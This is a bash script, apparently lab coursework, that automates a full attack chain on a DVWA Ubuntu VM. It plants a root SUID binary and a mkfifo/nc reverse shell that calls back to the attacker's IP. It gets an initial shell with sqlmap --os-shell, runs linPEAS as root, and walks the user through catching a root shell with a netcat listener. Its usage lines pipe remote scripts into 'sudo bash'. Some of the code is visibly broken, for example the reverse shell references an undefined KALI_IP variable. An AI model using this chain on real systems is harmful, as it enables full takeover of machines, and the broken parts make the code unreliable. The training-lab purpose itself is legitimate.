#!/bin/bash
# Script Name: dvwa-peas.sh
# Description: Automates privilege escalation setup on a DVWA Ubuntu VM and guides the user through the exploit.

#
# === Usage Instructions ===
#
# --- For Ubuntu DVWA VM (The Target) ---
#
# Set up the SUID binary and reverse shell script:
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | sudo bash -s suid_setup
#
# Download and run the linPEAS privilege escalation scanner:
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | sudo bash -s peas_scan
#
# --- For Kali VM (The Attacker) ---
#
# Get the initial www-data shell via sqlmap (prerequisite):
#   DVWA_PHPSESSID=<ID> DVWA_TARGET_URL="http://<IP>" sudo -E bash -s kali_get_shell
#
# Display instructions on how to trigger the exploit and catch the root shell:
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | sudo bash -s trigger_exploit
#

# --- Script Configuration ---
LOGFILE="$(pwd)/dvwa-peas-$(date +"%Y%m%d-%H%M%S").log"
exec > >(tee -a "$LOGFILE") 2>&1

set -euo pipefail
IFS=$'\n\t'

# === ASCII Art Banner & Color Constants ===
echo ""
echo "##################################################################################"
echo "#    ____   __    __   ____    __    __      ____  _______   _______   _______     #"
echo "#   |  _  \ |  |  |  | |  _  \  \  \  /  /    / __ \ |       \ |       \ |       \    #"
echo "#   | | | | |  |  |  | | | | |   \  \/  /    | /  \ ||  .--.  ||  .--.  ||  .--.  |   #"
echo "#   | | | | |  |  |  | | | | |    \    /     | |  | ||  |  |  ||  |  |  ||  |  |  |   #"
echo "#   | |_| | |  '--'  | | |_| |     |  |      | \__/ ||  '--'  ||  '--'  ||  '--'  |   #"
echo "#   |____ /  \______/  |____ /      |__|       \____/ |_______/ |_______/ |_______/    #"
echo "#                                                                                #"
echo "#                     DVWA Privilege Escalation Automation Suite (PEAS)          #"
echo "##################################################################################"
echo ""
RESET="\033[0m"; GREEN="\033[1;32m"; RED="\033[1;31m"; YELLOW="\033[1;33m"; CYAN="\033[1;36m"; PINK="\033[1;35m"

# === Helper Functions ===
print_info() { echo -e "${CYAN}[INFO]${RESET} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${RESET} $1"; }
print_warn() { echo -e "${YELLOW}[WARNING]${RESET} $1"; }
print_error() { echo -e "${RED}[ERROR]${RESET} $1 ❌"; }
print_title() { echo -e "\n${PINK}=== $1 ===${RESET}\n"; }

cleanup() {
  local exit_code=$?
  if [ $exit_code -ne 0 ]; then print_error "Script exited with error code: $exit_code"; fi
  print_info "Cleaning up before exit."
}
trap cleanup EXIT
handle_interrupt() { print_error "Script interrupted by user (SIGINT)" >&2; exit 130; }
trap handle_interrupt INT

### === UBUNTU VM FUNCTIONS (TARGET) === ###

ubuntu_setup_suid_escalation() {
    print_title "Setting Up SUID Privilege Escalation Binaries on Ubuntu VM"

    # --- Step 1: Get Attacker IP for the Reverse Shell ---
    local KALI_HOST_IP
    echo -ne "${CYAN}Enter your Kali VM's IP address (e.g., 192.168.56.1 for the reverse shell to connect to, 15s timeout): ${RESET}"
    if [ -z "$2" ]; then
        read -t 15 -p "Enter Kali IP: " KALI_HOST_IP
        if [ -z "$KALI_HOST_IP" ]; then
            echo "Kali IP address cannot be empty. Aborting."
            exit 1
        fi
    else
        KALI_HOST_IP="$2"
    fi
    print_info "Reverse shell will connect back to: ${KALI_HOST_IP}"
    echo ""

    # --- Step 2: Create the C Program for Escalation ---
    print_info "Creating C source file at /tmp/escalate.c..."
    tee /tmp/escalate.c > /dev/null <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash /tmp/im_root.sh");
    return 0;
}
EOF
    print_success "C source file created."

    # --- Step 3: Compile the Program ---
    print_info "Compiling /tmp/escalate.c into /tmp/escalate..."
    if ! command -v gcc &> /dev/null; then
        print_warn "gcc not found. Installing 'build-essential' package..."
        apt-get update && apt-get install -y build-essential
    fi
    if gcc -o /tmp/escalate /tmp/escalate.c; then
        print_success "Compilation successful."
    else
        print_error "Compilation failed. Please check for errors."
        exit 1
    fi

    # --- Step 4: Set Ownership and SUID Permissions ---
    print_info "Setting ownership and permissions on the 'escalate' binary..."
    # The tutorial mentions `users` group, which is standard.
    chown root:users /tmp/escalate
    chmod u+x /tmp/escalate
    # Set SUID (s) for user and group
    chmod ug+s /tmp/escalate
    print_success "Ownership set to 'root:users' and SUID bit set."
    ls -l /tmp/escalate # Show the result for verification

    # --- Step 5: Create the Reverse Shell Script ---
    print_info "Creating reverse shell script at /tmp/im_root.sh..."
    tee /tmp/im_root.sh > /dev/null <<EOF
#!/bin/bash
# This script creates a reverse shell back to the attacker (Kali VM).
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc ${KALI_IP} 1234 > /tmp/f
EOF
    chmod +x /tmp/im_root.sh
    print_success "Reverse shell script created and made executable."
    
    print_title "SUID Escalation Setup Complete"
    print_info "The next step is to get a 'www-data' shell via sqlmap and then trigger the exploit."
    print_info "You can run this script with the 'trigger_exploit' argument for instructions."
}

ubuntu_run_peas_scan() {
    print_title "Running linPEAS Privilege Escalation Scanner"
    
    local PEAS_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
    local PEAS_SCRIPT_PATH="/tmp/linpeas.sh"
    local PEAS_REPORT_PATH="/tmp/linpeas_scan_report.txt"

    print_info "Downloading the latest linpeas.sh script..."
    if wget -q "$PEAS_URL" -O "$PEAS_SCRIPT_PATH"; then
        print_success "linpeas.sh downloaded to ${PEAS_SCRIPT_PATH}."
    else
        print_error "Failed to download linpeas.sh. Check network connection or URL."
        exit 1
    fi
    
    chmod +x "$PEAS_SCRIPT_PATH"

    print_info "Running linPEAS scan as root. This may take a few minutes..."
    print_warn "Full color-coded output will be saved to ${PEAS_REPORT_PATH}."
    
    # Run the script and save its output
    bash "$PEAS_SCRIPT_PATH" > "$PEAS_REPORT_PATH"
    
    print_success "linPEAS scan complete."
    print_info "To review the report, run the following command on your Ubuntu VM:"
    echo -e "${GREEN}less -R ${PEAS_REPORT_PATH}${RESET}"
    print_info "Inside 'less', you can search for keywords like 'WARNING' or 'privilege' by typing '/' followed by the word and pressing Enter."
}

### === KALI VM FUNCTIONS (ATTACKER) === ###

kali_exploit_sqlmap_os_shell() {
    # This function is included from the previous script to make this one self-contained.
    print_title "Running SQLmap OS Shell Exploitation"
    if [ -z "${DVWA_TARGET_URL:-}" ]; then print_error "DVWA_TARGET_URL not set."; exit 1; fi
    if [ -z "${DVWA_PHPSESSID:-}" ]; then print_error "DVWA_PHPSESSID not set."; exit 1; fi
    print_info "Using DVWA Target URL: ${DVWA_TARGET_URL}"; print_info "Using PHPSESSID: ${DVWA_PHPSESSID}"
    local TARGET="${DVWA_TARGET_URL%/}"; local PHPSESSID="$DVWA_PHPSESSID"; local TARGET_USER=$(logname 2>/dev/null || echo "$SUDO_USER"); local USER_HOME=$(eval echo "~${TARGET_USER}"); local OUTDIR="${USER_HOME}/scans/dvwa/os_shell_loot"
    sudo mkdir -p "$OUTDIR"; sudo chown -R "$TARGET_USER":"$TARGET_USER" "$OUTDIR"
    print_warn "This requires DVWA security 'Low', a vulnerable MySQL backend, and a world-writable web directory."
    local SQLI_URL="${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"; local COOKIE_STRING="Cookie: security=low; PHPSESSID=${PHPSESSID}"; local CSRF_URL="${TARGET}/login.php"
    declare -a SQLMAP_BASE_ARGS=("-u" "${SQLI_URL}" "-H" "${COOKIE_STRING}" "--csrf-token=user_token" "--csrf-url=${CSRF_URL}" "--batch" "--flush-session" "--web-root=/var/www/html/dvwa" "--output-dir=${OUTDIR}")
    local CMD="whoami"; local CMD_LOG="${OUTDIR}/initial_shell_whoami.log"
    print_info "Attempting to get initial 'www-data' shell with 'whoami' command..."
    sudo -u "$TARGET_USER" sqlmap "${SQLMAP_BASE_ARGS[@]}" --os-shell
    print_success "SQLmap OS shell process finished. If successful, you should have an interactive shell."
    print_warn "If the shell did not spawn, check the logs in ${OUTDIR} for errors."
}

guide_trigger_escalation() {
    print_title "Guide: Triggering the Privilege Escalation"
    print_info "This process requires two terminals: one on your Kali VM and one in your active sqlmap shell."

    print_info "\n--- Step 1: On your KALI VM (Attacker) ---"
    print_info "Open a new terminal and start a netcat listener to catch the incoming root shell."
    print_info "Run this exact command:"
    echo -e "${GREEN}nc -lvnp 1234${RESET}"
    print_warn "Your terminal will now be waiting. Do not close it."
    
    print_info "\n--- Step 2: In your SQLMAP OS SHELL (The www-data shell on the Target) ---"
    print_info "You should already have an OS shell from running the 'kali_get_shell' command."
    print_info "First, verify you are the 'www-data' user by typing:"
    echo -e "${GREEN}whoami${RESET}"
    print_info "Now, execute the SUID binary you created earlier:"
    echo -e "${GREEN}/tmp/escalate${RESET}"

    print_info "\n--- Step 3: Check your KALI VM Netcat Listener ---"
    print_success "If successful, your netcat listener terminal will now be an interactive ROOT SHELL on the Ubuntu VM!"
    print_info "To verify, type 'whoami' in the netcat terminal. The output should be:"
    echo -e "${RED}root${RESET}"
    print_info "You now have full control of the target machine."
}

# === MAIN LOGIC ===
case "${1:-}" in
    "suid_setup")
        ubuntu_setup_suid_escalation
        ;;
    "peas_scan")
        ubuntu_run_peas_scan
        ;;
    "kali_get_shell")
        kali_exploit_sqlmap_os_shell
        ;;
    "trigger_exploit")
        guide_trigger_escalation
        ;;
    *)
        print_error "Invalid argument: '${1:-}'"
        echo "Usage: wget -qO- <script_url> | sudo [-E] bash -s <argument>"
        echo ""
        echo "Arguments for Ubuntu DVWA VM (Target):"
        echo "  suid_setup      : Creates the SUID binary and reverse shell script for privilege escalation."
        echo "  peas_scan       : Downloads and runs the linPEAS host scanner."
        echo ""
        echo "Arguments for Kali VM (Attacker):"
        echo "  kali_get_shell  : Runs sqlmap to get the initial www-data OS shell."
        echo "  trigger_exploit : Shows instructions on how to use the exploit and catch the root shell."
        exit 1
        ;;
esac
